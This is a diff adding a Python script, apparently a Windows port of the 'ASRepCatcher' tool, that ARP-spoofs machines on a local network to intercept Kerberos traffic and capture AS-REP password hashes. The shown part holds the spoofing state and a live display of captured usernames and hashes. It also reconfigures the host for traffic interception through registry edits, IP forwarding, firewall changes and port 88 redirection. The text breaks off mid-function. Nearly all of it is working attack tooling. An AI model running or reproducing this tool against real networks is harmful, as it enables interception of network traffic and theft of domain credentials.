@@ -1,0 +1,2339 @@
+#!/usr/bin/env python3
+
+# Authors : Yassine OUKESSOU, Samara Eli
+
+from scapy.all import *
+from scapy.layers.l2 import Ether, ARP
+from scapy.layers.inet import IP, TCP
+from scapy.sendrecv import sendp, send, srp, sniff
+from scapy.config import conf
+from scapy.arch import get_if_list, get_if_addr
+from scapy.packet import Packet, bind_layers, Raw
+from scapy.fields import XIntField, StrField
+
+# Import Kerberos layers - CRITICAL for proper operation
+try:
+    from scapy.layers.kerberos import *
+    KERBEROS_LAYERS_AVAILABLE = True
+except ImportError as e:
+    KERBEROS_LAYERS_AVAILABLE = False
+    
+    # Define minimal stubs to prevent import errors - BUT THESE WON'T WORK
+    class KRB_AS_REP: pass
+    class KRB_TGS_REP: pass  
+    class KRB_AS_REQ: pass
+    class KRB_TGS_REQ: pass
+    class KRB_ERROR: pass
+    class KerberosTCPHeader: pass
+
+# Try to import getmacbyip from different locations
+try:
+    from scapy.layers.l2 import getmacbyip
+except ImportError:
+    try:
+        from scapy.utils import getmacbyip
+    except ImportError:
+        # Fallback function if getmacbyip is not available
+        def getmacbyip(ip):
+            """Fallback function to get MAC address for IP"""
+            try:
+                ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip), timeout=2, verbose=False)
+                if ans:
+                    return ans[0][1].hwsrc
+            except:
+                pass
+            return None
+
+import asn1
+import os
+import subprocess
+import argparse
+import time
+import threading
+import ipaddress
+from termcolor import colored
+import socket
+import asyncio
+import logging
+import netifaces
+import ctypes
+import sys
+import re
+import tempfile
+import signal
+import atexit
+from datetime import datetime
+import struct
+
+# Rich library imports for enhanced formatting
+from rich.console import Console
+from rich.panel import Panel
+from rich.table import Table
+from rich.columns import Columns
+from rich.live import Live
+from rich.text import Text
+from rich.progress import Progress, SpinnerColumn, TextColumn, BarColumn, TimeElapsedColumn
+from rich.layout import Layout
+from rich.align import Align
+from rich import box
+
+# Global variables
+decoder = asn1.Decoder()
+stop_arp_spoofing_flag = threading.Event()
+cleanup_performed = False  # Flag to prevent multiple cleanup calls
+
+# Rich display management
+console = Console()
+live_display = None
+setup_complete = False
+
+# Global variables that will be set in main()
+mode = None
+outfile = None
+usersfile = None
+HashFormat = None
+iface = None
+disable_spoofing = None
+stop_spoofing = None
+gw = None
+dc = None
+debug = None
+hwsrc = None
+Targets = None
+InitialTargets = None
+TargetsList = None
+UsernamesCaptured = {}
+UsernamesSeen = set()
+AllUsernames = set()
+firewall_backup_file = None
+original_ip_forward = None
+relay_port = 88
+skip_redirection = False
+
+# Debug message scroll for live display
+debug_messages = []
+MAX_DEBUG_MESSAGES = 10
+
+import time
+import struct
+
+# =======================================
+# RICH DISPLAY MANAGEMENT
+# =======================================
+
+def add_debug_message(message):
+    """Add a debug message to the scrolling display"""
+    global debug_messages
+    debug_messages.append(f"[{datetime.now().strftime('%H:%M:%S')}] {message}")
+    if len(debug_messages) > MAX_DEBUG_MESSAGES:
+        debug_messages.pop(0)
+    update_live_display()
+
+def create_setup_panel():
+    """Create a setup information panel"""
+    setup_info = []
+    setup_info.append(f"[cyan]Mode:[/cyan] {mode}")
+    setup_info.append(f"[cyan]Interface:[/cyan] {iface}")
+    setup_info.append(f"[cyan]Gateway:[/cyan] {gw}")
+    if dc:
+        setup_info.append(f"[cyan]Domain Controller:[/cyan] {dc}")
+    setup_info.append(f"[cyan]Output File:[/cyan] {outfile}")
+    setup_info.append(f"[cyan]Users File:[/cyan] {usersfile}")
+    if not disable_spoofing:
+        setup_info.append(f"[cyan]ARP Spoofing:[/cyan] [green]Enabled[/green]")
+        setup_info.append(f"[cyan]Targets:[/cyan] {len(TargetsList) if TargetsList else 0} hosts")
+    else:
+        setup_info.append(f"[cyan]ARP Spoofing:[/cyan] [red]Disabled[/red]")
+    
+    panel = Panel(
+        "\n".join(setup_info),
+        title="[bold blue]ASRepCatcher-WIN Configuration[/bold blue]",
+        border_style="blue",
+        box=box.ROUNDED
+    )
+    return panel
+
+def create_arp_status_table():
+    """Create ARP spoofing status table"""
+    table = Table(title="ARP Spoofing Status", box=box.ROUNDED, show_header=True, header_style="bold magenta")
+    table.add_column("Status", style="cyan", no_wrap=True)
+    table.add_column("Targets", style="green", no_wrap=True)
+    table.add_column("Active", style="yellow", no_wrap=True)
+    table.add_column("Packets Sent", style="blue", no_wrap=True)
+    
+    if disable_spoofing:
+        table.add_row("[red]Disabled[/red]", "N/A", "N/A", "N/A")
+    else:
+        target_count = len(Targets) if Targets else 0
+        initial_count = len(InitialTargets) if InitialTargets else 0
+        active_targets = len([t for t in (Targets if Targets else []) if t])
+        
+        status = "[green]Active[/green]" if target_count > 0 else "[yellow]Waiting[/yellow]"
+        table.add_row(status, f"{initial_count}", f"{active_targets}", "Continuous")
+    
+    return table
+
+def create_hash_capture_table():
+    """Create hash capture results table"""
+    table = Table(title="Captured Hashes", box=box.ROUNDED, show_header=True, header_style="bold green")
+    table.add_column("Username", style="cyan", no_wrap=True)
+    table.add_column("Domain", style="magenta", no_wrap=True)
+    table.add_column("Encryption Type", style="yellow", no_wrap=True)
+    table.add_column("Status", style="green", no_wrap=True)
+    table.add_column("Time", style="blue", no_wrap=True)
+    
+    if not UsernamesCaptured:
+        table.add_row("[dim]No hashes captured yet[/dim]", "", "", "", "")
+    else:
+        for username, etypes in UsernamesCaptured.items():
+            for etype in etypes:
+                time_str = time.strftime("%H:%M:%S")
+                table.add_row(username, "[dim]domain[/dim]", str(etype), "[green]Captured[/green]", time_str)
+    
+    return table
+
+def create_listener_stats_panel():
+    """Create listener statistics panel with debug messages"""
+    stats_info = []
+    stats_info.append(f"[green]Hashes Captured:[/green] {len(UsernamesCaptured)}")
+    stats_info.append(f"[blue]Usernames Seen:[/blue] {len(UsernamesSeen)}")
+    stats_info.append(f"[yellow]Total Users:[/yellow] {len(AllUsernames)}")
+    stats_info.append(f"[cyan]Mode:[/cyan] {mode}")
+    
+    # Add debug messages section
+    if debug_messages:
+        stats_info.append("")
+        stats_info.append("[bold yellow]Recent Debug Messages:[/bold yellow]")
+        for msg in debug_messages[-5:]:  # Show last 5 messages
+            stats_info.append(f"[dim]{msg}[/dim]")
+    
+    panel = Panel(
+        "\n".join(stats_info),
+        title="[bold green]Live Statistics[/bold green]",
+        border_style="green",
+        box=box.ROUNDED
+    )
+    return panel
+
+def create_main_layout():
+    """Create the main display layout"""
+    layout = Layout()
+    
+    # Divide into three main sections
+    layout.split_column(
+        Layout(name="setup", size=8),
+        Layout(name="arp_status", size=8),
+        Layout(name="captures")
+    )
+    
+    # Setup section
+    layout["setup"].update(create_setup_panel())
+    
+    # ARP status section
+    layout["arp_status"].update(create_arp_status_table())
+    
+    # Captures section - split between stats and hash table
+    layout["captures"].split_row(
+        Layout(create_listener_stats_panel(), name="stats", ratio=1),
+        Layout(create_hash_capture_table(), name="hashes", ratio=2)
+    )
+    
+    return layout
+
+def update_live_display():
+    """Update the live display with current information"""
+    global live_display
+    if live_display and setup_complete:
+        layout = create_main_layout()
+        live_display.update(layout)
+
+def start_live_display():
+    """Start the Rich live display"""
+    global live_display
+    if not live_display:
+        layout = create_main_layout()
+        live_display = Live(layout, console=console, refresh_per_second=2, auto_refresh=True)
+        live_display.start()
+
+def stop_live_display():
+    """Stop the Rich live display"""
+    global live_display
+    if live_display:
+        live_display.stop()
+        live_display = None
+
+def print_setup_banner():
+    """Print the setup banner using Rich"""
+    banner_text = """
+╔════════════════════════════════════════════════════════════════════════════════════════════════════════╗
+║    █████╗ ███████╗██████╗ ███████╗██████╗  ██████╗ █████╗ ████████╗ ██████╗██╗  ██╗███████╗██████╗     ║
+║   ██╔══██╗██╔════╝██╔══██╗██╔════╝██╔══██╗██╔════╝██╔══██╗╚══██╔══╝██╔════╝██║  ██║██╔════╝██╔══██╗    ║
+║   ███████║███████╗██████╔╝█████╗  ██████╔╝██║     ███████║   ██║   ██║     ███████║█████╗  ██████╔╝    ║
+║   ██╔══██║╚════██║██╔══██╗██╔══╝  ██╔═══╝ ██║     ██╔══██║   ██║   ██║     ██╔══██║██╔══╝  ██╔══██╗    ║
+║   ██║  ██║███████║██║  ██║███████╗██║     ╚██████╗██║  ██║   ██║   ╚██████╗██║  ██║███████╗██║  ██║    ║
+║   ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚══════╝╚═╝      ╚═════╝╚═╝  ╚═╝   ╚═╝    ╚═════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝    ║
+║                                                                                                        ║
+║                                  Windows Edition - Enhanced Interface                                  ║
+║                            Authors:  Samara Eli, forked from Yassine OUKESSOU                          ║
+║                                              Version: 0.0.1                                            ║
+╚════════════════════════════════════════════════════════════════════════════════════════════════════════╝
+    """
+    
+    console.print(Panel(
+        Text(banner_text.strip(), style="bold cyan"),
+        border_style="cyan",
+        box=box.DOUBLE
+    ))
+
+def rich_print_info(message, style="cyan"):
+    """Print info message using Rich when live display is not active"""
+    if not live_display:
+        console.print(f"[{style}][*][/{style}] {message}")
+    add_debug_message(f"[INFO] {message}")
+
+def rich_print_success(message):
+    """Print success message using Rich"""
+    if not live_display:
+        console.print(f"[bold green][+][/bold green] {message}")
+
+def rich_print_warning(message):
+    """Print warning message using Rich"""
+    if not live_display:
+        console.print(f"[bold yellow][!][/bold yellow] {message}")
+    add_debug_message(f"[WARN] {message}")
+
+def rich_print_error(message):
+    """Print error message using Rich"""
+    if not live_display:
+        console.print(f"[bold red][!][/bold red] {message}")
+    add_debug_message(f"[ERROR] {message}")
+
+def rich_print_hash(username, domain, etype, hash_string):
+    """Print captured hash with Rich formatting"""
+    # Always print hash captures prominently
+    hash_panel = Panel(
+        f"[bold cyan]Username:[/bold cyan] {username}@{domain}\n"
+        f"[bold yellow]Encryption Type:[/bold yellow] {etype}\n"
+        f"[bold green]Hash:[/bold green] {hash_string}",
+        title="[bold green]🎯 HASH CAPTURED! 🎯[/bold green]",
+        border_style="green",
+        box=box.DOUBLE
+    )
+    console.print(hash_panel)
+    
+    # Update live display if active
+    update_live_display()
+
+# =======================================
+# SIGNAL HANDLING AND CLEANUP
+# =======================================
+
+def check_port_usage(port=88):
+    """Check what processes are using the specified port"""
+    try:
+        result = subprocess.run(['netstat', '-ano'], capture_output=True, text=True, timeout=5)
+        lines = result.stdout.split('\n')
+        port_lines = [line for line in lines if f':{port} ' in line and 'LISTENING' in line]
+        
+        if port_lines:
+            rich_print_warning(f'[PORT CHECK] Found processes using port {port}:')
+            for line in port_lines:
+                parts = line.split()
+                if len(parts) >= 5:
+                    pid = parts[-1]
+                    rich_print_info(f'[PORT CHECK] PID {pid}: {line.strip()}', 'yellow')
+                    
+                    # Try to get process name
+                    try:
+                        tasklist_result = subprocess.run(['tasklist', '/FI', f'PID eq {pid}'], 
+                                                       capture_output=True, text=True, timeout=3)
+                        if tasklist_result.returncode == 0:
+                            tasklist_lines = tasklist_result.stdout.split('\n')
+                            for tl in tasklist_lines:
+                                if pid in tl:
+                                    rich_print_info(f'[PORT CHECK] Process: {tl.strip()}', 'cyan')
+                                    break
+                    except:
+                        pass
+            return True
+        else:
+            rich_print_success(f'[PORT CHECK] Port {port} appears to be free')
+            return False
+    except Exception as e:
+        rich_print_warning(f'[PORT CHECK] Could not check port usage: {e}')
+        return False
+
+def cleanup_port_88():
+    """Clean up anything that might be using port 88"""
+    rich_print_info('[CLEANUP] Checking for port 88 conflicts...', 'yellow')
+    
+    # First clean up our own traffic redirection
+    cleanup_traffic_redirection()
+    
+    # Check if port is still in use
+    if check_port_usage(88):
+        rich_print_warning('[CLEANUP] Port 88 is still in use after cleanup')
+        rich_print_info('[CLEANUP] This might be Windows Kerberos service or another application', 'yellow')
+        rich_print_info('[CLEANUP] Consider stopping conflicting services or using --disable-spoofing mode', 'yellow')
+        return False
+    
+    return True
+
+def cleanup_all():
+    """Comprehensive cleanup function called on exit."""
+    global firewall_backup_file, original_ip_forward, stop_arp_spoofing_flag, cleanup_performed
+    
+    # Prevent multiple cleanup calls
+    if cleanup_performed:
+        return
+    cleanup_performed = True
+    
+    # Stop live display first
+    stop_live_display()
+    
+    try:
+        # Stop ARP spoofing
+        if not disable_spoofing:
+            stop_arp_spoofing_flag.set()
+            if 'Targets' in globals() and Targets is not None:
+                rich_print_info('Restoring ARP cache, please hold...')
+                restore_all_targets()
+    except Exception as e:
+        if debug:
+            rich_print_error(f'Error during ARP cleanup: {e}')
+    
+    try:
+        # Clean up traffic redirection and port bindings
+        cleanup_port_88()
+    except Exception as e:
+        if debug:
+            rich_print_error(f'Error during traffic redirection cleanup: {e}')
+    
+    try:
+        # Restore IP forwarding
+        if original_ip_forward is not None:
+            restore_ip_forwarding(original_ip_forward)
+            if debug:
+                rich_print_success('Restored original IP forwarding setting')
+    except Exception as e:
+        if debug:
+            rich_print_error(f'Error restoring IP forwarding: {e}')
+    
+    try:
+        # Restore firewall rules
+        if firewall_backup_file is not None:
+            restore_firewall_rules(firewall_backup_file)
+            if debug:
+                rich_print_success('Restored firewall backup')
+    except Exception as e:
+        if debug:
+            rich_print_error(f'Error restoring firewall: {e}')
+
+def signal_handler(sig, frame):
+    """Handle signals for graceful shutdown."""
+    # Stop live display first
+    stop_live_display()
+    
+    console.print(f'\n[bold yellow][*][/bold yellow] Received interrupt signal {sig}, cleaning up...')
+    if debug:
+        console.print(f'[dim][DEBUG] Signal handler called from frame: {frame}[/dim]')
+    
+    # Set the global stop flags immediately
+    try:
+        stop_arp_spoofing_flag.set()
+    except NameError:
+        pass  # Flag might not be initialized yet
+    
+    try:
+        cleanup_all()
+    except Exception as e:
+        console.print(f'[bold red][!][/bold red] Error during cleanup: {e}')
+    finally:
+        console.print('[bold green][*][/bold green] Cleanup completed, exiting...')
+        
+        # Print final summary if we have captured data
+        try:
+            if (UsernamesCaptured and len(UsernamesCaptured) > 0) or (UsernamesSeen and len(UsernamesSeen) > 0):
+                summary_panel = Panel(
+                    f"[green]Hashes Captured:[/green] {len(UsernamesCaptured)}\n"
+                    f"[blue]Usernames Seen:[/blue] {len(UsernamesSeen)}\n"
+                    f"[yellow]Output File:[/yellow] {outfile}\n"
+                    f"[cyan]Users File:[/cyan] {usersfile}",
+                    title="[bold green]Session Summary[/bold green]",
+                    border_style="green",
+                    box=box.ROUNDED
+                )
+                console.print(summary_panel)
+        except NameError:
+            pass  # Variables might not be initialized yet
+        
+        # Force exit immediately - don't wait for anything
+        try:
+            os._exit(0)
+        except:
+            # Last resort
+            import sys
+            sys.exit(1)
+
+# =======================================
+# UTILITY FUNCTIONS
+# =======================================
+
+def is_admin():
+    """Check if the script is running with administrator privileges."""
+    try:
+        return ctypes.windll.shell32.IsUserAnAdmin()
+    except:
+        return False
+
+def display_banner():
+    """Display the ASRepCatcher banner using Rich formatting"""
+    print_setup_banner()
+
+def is_dc_up(dc):
+    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    sock.settimeout(1)
+    result = sock.connect_ex((dc,88))
+    sock.close()
+    if result == 0:
+        return True
+    return False
+
+def is_valid_ip_list(iplist):
+    if not re.match(r'^(((25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?),)*((25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$', iplist) :
+        return False
+    return True
+
+def is_valid_ipwithmask(ip_with_mask):
+    if not re.match(r'^([01]?\d\d?|2[0-4]\d|25[0-5])(?:\.(?:[01]?\d\d?|2[0-4]\d|25[0-5])){3}(?:/[0-2]\d|/3[0-2])?$', ip_with_mask):
+        return False
+    return True
+
+
+
+def valid_ip(address):
+    try: 
+        a = ipaddress.ip_address(address)
+        return True
+    except:
+        return False
+
+def get_available_interfaces():
+    """Get list of available network interfaces with their details - Scapy compatible"""
+    interfaces = []
+    try:
+        # Start with Scapy interface list - these are the names that actually work
+        scapy_interfaces = get_if_list()
+        
+        for scapy_iface in scapy_interfaces:
+            try:
+                # Get IP address using Scapy
+                ip_addr = get_if_addr(scapy_iface)
+                
+                # Skip interfaces without proper IP (like 0.0.0.0 or empty)
+                if not ip_addr or ip_addr == '0.0.0.0':
+                    continue
+                
+                # Get MAC address and other details
+                mac_addr = 'N/A'
+                netmask = 'N/A'
+                
+                try:
+                    # Try to get additional details from netifaces if available
+                    for neti_name in netifaces.interfaces():
+                        try:
+                            neti_addrs = netifaces.ifaddresses(neti_name)
+                            if netifaces.AF_INET in neti_addrs:
+                                neti_ip = neti_addrs[netifaces.AF_INET][0].get('addr', '')
+                                if neti_ip == ip_addr:
+                                    netmask = neti_addrs[netifaces.AF_INET][0].get('netmask', 'N/A')
+                                    if netifaces.AF_LINK in neti_addrs:
+                                        mac_addr = neti_addrs[netifaces.AF_LINK][0].get('addr', 'N/A')
+                                    break
+                        except:
+                            continue
+                except:
+                    pass
+                
+                # Create a user-friendly display name
+                display_name = scapy_iface
+                if len(scapy_iface) > 25:
+                    # Shorten long interface names for display
+                    display_name = f"{scapy_iface[:12]}...{scapy_iface[-8:]}"
+                
+                interfaces.append({
+                    'name': scapy_iface,  # This is the Scapy-compatible name
+                    'display_name': display_name,
+                    'ip': ip_addr,
+                    'netmask': netmask,
+                    'mac': mac_addr
+                })
+            except Exception as e:
+                # Skip interfaces that cause errors
+                continue
+                
+    except Exception as e:
+        logging.error(f'[!] Could not enumerate interfaces: {e}')
+    
+    return interfaces
+
+def select_interface():
+    """Let user select network interface"""
+    interfaces = get_available_interfaces()
+    
+    if not interfaces:
+        rich_print_error('No network interfaces found with IPv4 addresses')
+        return None
+    
+    # Create interface selection table
+    table = Table(title="Available Network Interfaces", box=box.ROUNDED, show_header=True, header_style="bold cyan")
+    table.add_column("ID", style="cyan", no_wrap=True, width=4)
+    table.add_column("Interface Name", style="green", width=25)
+    table.add_column("IP Address", style="yellow", width=15)
+    table.add_column("MAC Address", style="magenta", width=17)
+    
+    for i, iface_info in enumerate(interfaces):
+        table.add_row(
+            str(i+1),
+            iface_info['display_name'],
+            iface_info['ip'],
+            iface_info['mac']
+        )
+    
+    console.print(table)
+    
+    while True:
+        try:
+            choice = console.input(f"\n[cyan]Select interface (1-{len(interfaces)}): [/cyan]").strip()
+            if choice.isdigit():
+                idx = int(choice) - 1
+                if 0 <= idx < len(interfaces):
+                    selected = interfaces[idx]
+                    rich_print_success(f"Selected interface: {selected['display_name']} ({selected['ip']})")
+                    # Return the actual Scapy name that will work
+                    return selected['name']
+            rich_print_warning(f"Please enter a number between 1 and {len(interfaces)}")
+        except (KeyboardInterrupt, EOFError):
+            rich_print_warning("Interface selection cancelled")
+            return None
+        except Exception as e:
+            rich_print_error(f"Invalid input: {e}")
+
+def get_temp_file_path(filename):
+    """Get a cross-platform temporary file path."""
+    temp_dir = tempfile.gettempdir()
+    return os.path.join(temp_dir, filename)
+
+# ============================================================================
+# NETWORK CONFIGURATION FUNCTIONS
+# ============================================================================
+
+def get_ip_forwarding_status():
+    """Get current IP forwarding status."""
+    try:
+        result = subprocess.run(['netsh', 'interface', 'ipv4', 'show', 'global'], 
+                              capture_output=True, text=True, check=True, timeout=10)
+        # Look for "Forwarding" in the output
+        return "Enabled" in result.stdout and "Forwarding" in result.stdout
+    except:
+        return False
+
+def enable_ip_forwarding():
+    """Enable IP forwarding on Windows using both netsh and registry methods."""
+    try:
+        rich_print_info('[IP FORWARD] Enabling Windows IP forwarding for ARP spoofing...', 'yellow')
+        
+        # Method 1: Traditional netsh command
+        result1 = subprocess.run(['netsh', 'interface', 'ipv4', 'set', 'global', 'forwarding=enabled'], 
+                              capture_output=True, text=True, check=True, timeout=10)
+        
+        # Method 2: Registry method (CRITICAL for ARP spoofing to work properly)
+        # This is the critical fix for Windows ARP spoofing + packet forwarding
+        registry_result = subprocess.run([
+            'reg', 'add', 
+            'HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\Tcpip\\Parameters',
+            '/t', 'REG_DWORD', 
+            '/v', 'IPEnableRouter', 
+            '/d', '1', 
+            '/f'
+        ], capture_output=True, text=True, timeout=10)
+        
+        # Method 3: ADDITIONAL Windows configuration for packet redirection
+        # Enable routing on the specific interface - CRITICAL for ARP spoofing
+        try:
+            # This is often the missing piece for Windows ARP spoofing
+            result_iface = subprocess.run([
+                'netsh', 'interface', 'ipv4', 'set', 'interface', 
+                f'interface="{iface}"', 'forwarding=enabled'
+            ], capture_output=True, text=True, timeout=10)
+            
+            if result_iface.returncode == 0:
+                rich_print_success('[IP FORWARD] ✓ Interface-specific routing enabled')
+            else:
+                rich_print_warning(f'[IP FORWARD] Interface routing warning: {result_iface.stderr}')
+                
+        except Exception as iface_e:
+            rich_print_warning(f'[IP FORWARD] Interface config error: {iface_e}')
+        
+        # Method 4: Additional Windows routing service
+        try:
+            routing_result = subprocess.run(['sc', 'config', 'RemoteAccess', 'start=', 'auto'], 
+                                          capture_output=True, text=True, timeout=10)
+            start_result = subprocess.run(['sc', 'start', 'RemoteAccess'], 
+                                        capture_output=True, text=True, timeout=10)
+        except Exception as service_e:
+            pass  # Service setup is optional
+        
+        # Return success if at least one method worked
+        success = (result1.returncode == 0) or (registry_result.returncode == 0)
+        if success:
+            rich_print_success('[IP FORWARD] ✓ Windows IP forwarding enabled for ARP spoofing')
+        
+        return success
+        
+    except Exception as e:
+        rich_print_error(f'[IP FORWARD] Could not enable IP forwarding on Windows: {e}')
+        return False
+
+def restore_ip_forwarding(original_status):
+    """Restore IP forwarding to original status."""
+    try:
+        rich_print_info('[CLEANUP] Restoring IP forwarding settings...', 'yellow')
+        
+        # Method 1: Restore netsh setting
+        status = 'enabled' if original_status else 'disabled'
+        subprocess.run(['netsh', 'interface', 'ipv4', 'set', 'global', f'forwarding={status}'], 
+                      capture_output=True, text=True, check=True, timeout=10)
+        rich_print_info(f'[CLEANUP] ✓ netsh IP forwarding restored to {status}', 'green')
+        
+        # Method 2: Restore registry setting if we had disabled it
+        if not original_status:
+            registry_result = subprocess.run([
+                'reg', 'add', 
+                'HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\Tcpip\\Parameters',
+                '/t', 'REG_DWORD', 
+                '/v', 'IPEnableRouter', 
+                '/d', '0', 
+                '/f'
+            ], capture_output=True, text=True, timeout=10)
+            
+            if registry_result.returncode == 0:
+                rich_print_info('[CLEANUP] ✓ Registry IP forwarding restored to original state', 'green')
+            else:
+                rich_print_warning(f'[CLEANUP] Could not restore registry IP forwarding: {registry_result.stderr}')
+        
+        logging.info('[*] Restored IP forwarding value on Windows')
+        
+    except Exception as e:
+        rich_print_warning(f'[CLEANUP] Could not restore IP forwarding on Windows: {e}')
+        logging.error(f'[!] Could not restore IP forwarding on Windows: {e}')
+
+# ============================================================================
+# FIREWALL MANAGEMENT FUNCTIONS
+# ============================================================================
+
+def backup_firewall_rules():
+    """Backup current Windows Firewall rules."""
+    try:
+        # Export Windows Firewall rules
+        backup_file = get_temp_file_path('asrepcatcher_firewall_backup.wfw')
+        
+        # Remove existing backup file if it exists
+        try:
+            if os.path.exists(backup_file):
+                os.remove(backup_file)
+                logging.debug(f'[*] Removed existing backup file: {backup_file}')
+        except Exception as remove_e:
+            logging.debug(f'[*] Could not remove existing backup file: {remove_e}')
+        
+        # First, check if Windows Firewall service is running
+        try:
+            service_check = subprocess.run(['sc', 'query', 'MpsSvc'], 
+                                         capture_output=True, text=True, check=True, timeout=10)
+            if 'RUNNING' not in service_check.stdout:
+                logging.warning('[!] Windows Firewall service (MpsSvc) is not running')
+                logging.info('[*] Attempting to start Windows Firewall service...')
+                try:
+                    subprocess.run(['sc', 'start', 'MpsSvc'], 
+                                 capture_output=True, text=True, check=True, timeout=15)
+                    time.sleep(2)  # Give service time to start
+                except:
+                    logging.warning('[!] Could not start Windows Firewall service')
+        except:
+            logging.debug('[*] Could not check Windows Firewall service status')
+        
+        # Try the export command with detailed error reporting
+        result = subprocess.run(['netsh', 'advfirewall', 'export', backup_file], 
+                              capture_output=True, text=True, timeout=15)
+        
+        if result.returncode == 0:
+            logging.debug(f'[*] Successfully backed up firewall rules to {backup_file}')
+            return backup_file
+        else:
+            # Log the specific error
+            logging.error(f'[!] netsh advfirewall export failed with return code {result.returncode}')
+            logging.error(f'[!] stdout: {result.stdout}')
+            logging.error(f'[!] stderr: {result.stderr}')
+            
+            # Try alternative backup method - just create a minimal backup
+            logging.info('[*] Attempting alternative firewall backup method...')
+            try:
+                # Get current firewall state
+                result2 = subprocess.run(['netsh', 'advfirewall', 'show', 'allprofiles'], 
+                                       capture_output=True, text=True, check=True, timeout=10)
+                
+                # Save current state info to a text file for reference
+                alt_backup_file = get_temp_file_path('asrepcatcher_firewall_state.txt')
+                
+                # Remove existing alternative backup file if it exists
+                try:
+                    if os.path.exists(alt_backup_file):
+                        os.remove(alt_backup_file)
+                        logging.debug(f'[*] Removed existing alternative backup file: {alt_backup_file}')
+                except Exception as alt_remove_e:
+                    logging.debug(f'[*] Could not remove existing alternative backup file: {alt_remove_e}')
+                
+                with open(alt_backup_file, 'w') as f:
+                    f.write("ASRepCatcher Firewall State Backup\n")
+                    f.write("=" * 50 + "\n")
+                    f.write(result2.stdout)
+                    f.write("\n\nNote: This is a state backup, not a restorable export.\n")
+                    f.write("Manual firewall rule cleanup may be required.\n")
+                
+                logging.info(f'[*] Created alternative firewall state backup: {alt_backup_file}')
+                return alt_backup_file
+                
+            except Exception as alt_e:
+                logging.error(f'[!] Alternative backup method also failed: {alt_e}')
+                
+                # Final fallback - create an empty marker file
+                marker_file = get_temp_file_path('asrepcatcher_no_firewall_backup.txt')
+                
+                # Remove existing marker file if it exists
+                try:
+                    if os.path.exists(marker_file):
+                        os.remove(marker_file)
+                        logging.debug(f'[*] Removed existing marker file: {marker_file}')
+                except Exception as marker_remove_e:
+                    logging.debug(f'[*] Could not remove existing marker file: {marker_remove_e}')
+                
+                with open(marker_file, 'w') as f:
+                    f.write("No firewall backup available\n")
+                    f.write("Manual cleanup may be required\n")
+                
+                logging.warning('[!] No firewall backup possible - continuing with marker file')
+                logging.warning('[!] You may need to manually check firewall rules after execution')
+                return marker_file
+                
+    except Exception as e:
+        logging.error(f'[!] Could not back up Windows Firewall: {e}')
+        
+        # Create a marker file so the script can continue
+        try:
+            marker_file = get_temp_file_path('asrepcatcher_no_firewall_backup.txt')
+            
+            # Remove existing marker file if it exists
+            try:
+                if os.path.exists(marker_file):
+                    os.remove(marker_file)
+                    logging.debug(f'[*] Removed existing exception marker file: {marker_file}')
+            except Exception as exc_remove_e:
+                logging.debug(f'[*] Could not remove existing exception marker file: {exc_remove_e}')
+            
+            with open(marker_file, 'w') as f:
+                f.write("Firewall backup failed\n")
+                f.write("Manual cleanup may be required\n")
+            logging.warning('[!] Created backup failure marker - continuing execution')
+            return marker_file
+        except:
+            return None
+
+def configure_firewall_forwarding():
+    """Configure Windows Firewall for packet forwarding."""
+    try:
+        # Enable Windows Firewall forwarding
+        subprocess.run(['netsh', 'advfirewall', 'set', 'global', 'statefulFTP', 'disable'], 
+                      capture_output=True, text=True, check=True, timeout=15)
+        subprocess.run(['netsh', 'advfirewall', 'set', 'global', 'statefulftp', 'disable'], 
+                      capture_output=True, text=True, check=True, timeout=15)
+        logging.debug('[*] Configured Windows Firewall for forwarding')
+    except Exception as e:
+        logging.error(f'[!] Could not configure Windows Firewall: {e}')
+
+def cleanup_traffic_redirection():
+    """Clean up Windows traffic redirection rules."""
+    try:
+        rich_print_info('[CLEANUP] Removing Windows port redirection rules...', 'yellow')
+        
+        # Remove Windows port proxy redirection for Kerberos (port 88)
+        result = subprocess.run(['netsh', 'interface', 'portproxy', 'delete', 'v4tov4', 
+                      'listenport=88', 'listenaddress=0.0.0.0'], 
+                      capture_output=True, text=True, timeout=10)
+        if result.returncode == 0:
+            rich_print_success('[CLEANUP] Removed port 88 redirection rule')
+        else:
+            rich_print_info('[CLEANUP] No port 88 redirection rule to remove')
+        
+        # Also try to remove any alternative port redirections
+        for alt_port in [8888, 8889, 8890]:
+            try:
+                subprocess.run(['netsh', 'interface', 'portproxy', 'delete', 'v4tov4', 
+                              f'listenport={alt_port}', 'listenaddress=0.0.0.0'], 
+                              capture_output=True, text=True, timeout=5)
+            except:
+                pass
+        
+        # Try to remove the firewall rules we added
+        firewall_rules = ['ASRepCatcher_Kerberos', 'ASRepCatcher_Kerberos_8888', 'ASRepCatcher_Kerberos_8889']
+        for rule_name in firewall_rules:
+            try:
+                result = subprocess.run(['netsh', 'advfirewall', 'firewall', 'delete', 'rule', 
+                              f'name={rule_name}'], 
+                              capture_output=True, text=True, timeout=10)
+                if result.returncode == 0:
+                    rich_print_success(f'[CLEANUP] Removed firewall rule: {rule_name}')
+            except Exception as fw_e:
+                pass  # Rule might not exist
+        
+        # Give Windows time to release ports
+        time.sleep(1)
+        rich_print_success('[CLEANUP] Traffic redirection cleanup completed')
+        logging.debug('[*] Cleaned up Windows port redirection for Kerberos')
+            
+    except Exception as e:
+        rich_print_warning(f'[CLEANUP] Could not clean up Windows port redirection: {e}')
+        logging.debug(f'[*] Could not clean up Windows port redirection: {e}')
+
+def setup_traffic_redirection_alt(interface_name, relay_port):
+    """Set up Windows traffic redirection for Kerberos packets to alternative port."""
+    try:
+        rich_print_info(f'[RELAY] Setting up traffic redirection from port 88 to {relay_port}...', 'yellow')
+        
+        # Clear any existing portproxy rules for port 88
+        try:
+            subprocess.run(['netsh', 'interface', 'portproxy', 'delete', 'v4tov4', 
+                          'listenport=88', 'listenaddress=0.0.0.0'], 
+                          capture_output=True, text=True, timeout=10)
+        except:
+            pass
+        
+        # Set up Windows port redirection from 88 to relay_port
+        result = subprocess.run(['netsh', 'interface', 'portproxy', 'add', 'v4tov4', 
